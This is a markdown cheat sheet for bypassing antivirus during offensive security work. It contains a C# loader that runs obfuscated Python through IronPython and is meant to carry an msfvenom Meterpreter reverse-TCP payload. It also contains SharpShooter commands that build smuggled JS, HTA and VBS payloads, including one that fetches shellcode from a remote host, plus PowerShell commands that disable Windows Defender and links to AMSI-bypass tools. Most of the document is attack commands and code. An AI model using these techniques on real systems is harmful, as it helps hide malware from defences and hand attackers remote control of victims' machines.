# AV Bypass
## Contents
- [AV Bypass](#av-bypass)
  * [Contents](#contents)
  * [Tools](#tools)
    + [Veil Framework:](#veil-framework-)
    + [Shellter](#shellter)
    + [Sharpshooter](#sharpshooter)
  * [Donut:](#donut-)
  * [Vulcan](#vulcan)
  * [Scarecrow](#scarecrow)
  * [Sharpshooter](#sharpshooter-1)
  * [Commands](#commands)
- [Resources](#resources)
  * [Cheat sheets](#cheat-sheets)
  * [Workshops](#workshops)

## Bypassing AV     
Modify malware to evade signature analysis, encode using obfuscation tools, leverage permitted tools (Living Off the Land)    

IronPython:    
Execute obfuscated Python natively in a C# program, encode it as a variable then execute (no Python interpreter needed). Source: https://www.willhackforsushi.com/sec504/csharp_py.cs     
"""
// This is the excellent work of Chris Davis of Counter Hack
// Small edits by Joshua Wright for clarity

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace csharp_py
{
    class Program
    {
        static void Main(string[] args)
        {
            // Create an IronPython engine to execute Python code
            Microsoft.Scripting.Hosting.ScriptEngine pythonEngine =
                IronPython.Hosting.Python.CreateEngine();

            // Print the default search paths
            // You may need to manually add these paths to include the DLLs necessary for execution
            System.Console.Out.WriteLine("Search paths:");
            ICollection<string> searchPaths = pythonEngine.GetSearchPaths();
            foreach (string path in searchPaths)
            {
                System.Console.Out.WriteLine(path);
            }
            System.Console.Out.WriteLine();

            // Now modify the search paths to include the directory
            // where the standard library has been installed
            searchPaths.Add(@"..\..\Lib");
            searchPaths.Add(@"..\Lib");
            searchPaths.Add(@".\Lib");
            pythonEngine.SetSearchPaths(searchPaths);

            // Execute the malicious Python coce
            // Replace the payload below with your own, possibly the output of msfvenom
            // msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.75.1
            Microsoft.Scripting.Hosting.ScriptSource pythonScript = pythonEngine.CreateScriptSourceFromString("exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('cAByAGkAbgB0ACgAJwByAGUAcABsAGEAYwBlACAAdABoAGkAcwAgAHAAcgBpAG4AdAAgAHMAdABhAHQAZQBtAGUAbgB0ACAAdwBpAHQAaAAgAHQAaABlACAAbQBzAGYAdgBlAG4AbwBtACAAcAB5AHQAaABvAG4AIABwAGEAeQBsAG8AYQBkACcAKQA=')[0]))");
            pythonScript.Execute();
        }
    }
}
"""

## Tools     

### Veil Framework:

Install on Kali

    apt install veil
    /usr/share/veil/config/setup.sh --force --silent

Reference: https://github.com/Veil-Framework/Veil

### Shellter

Source: https://www.shellterproject.com/download/

    apt install shellter


### Sharpshooter

Javascript Payload Stageless: 

    SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

Stageless HTA Payload: 

    SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

Staged VBS:

    SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

Reference: https://github.com/mdsecactivebreach/SharpShooter

## Donut: 

Source: https://github.com/TheWover/donut

## Vulcan

Source: https://github.com/praetorian-code/vulcan


## Scarecrow

Source: https://github.com/optiv/ScareCrow

In Kali: 

    sudo apt install golang

    go get github.com/fatih/color
    go get github.com/yeka/zip
    go get github.com/josephspurrier/goversioninfo

    go build ScareCrow.go

    ./ScareCrow

## Sharpshooter
[SharpShooter](https://github.com/mdsecactivebreach/SharpShooter)   

Javascript Payload Stageless:   

    SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

Stageless HTA Payload: 

    SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

Staged VBS:

    SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4


## Commands 
Turning off Windows Defender 

    Set-MpPreference -DisableRealtimeMonitoring $true   

Need to run Powershell as admin and reboot after running command to turn off Windows Defender indefinetly: 

    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -name disableantispyware -value 1 -Force


View Windows Defender logs   

    Get-WinEvent 'Microsoft-Windows-Windows Defender/Operational' MaxEvents 10 | Where-Object Id -e 1116 | Format-List 


# Resources  
## Cheat sheets 
https://github.com/sinfulz/JustEvadeBro   
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell 

[AV Payloads](https://github.com/RoseSecurity/Anti-Virus-Evading-Payloads)    


## Workshops 
https://github.com/BC-SECURITY/Beginners-Guide-to-Obfuscation 




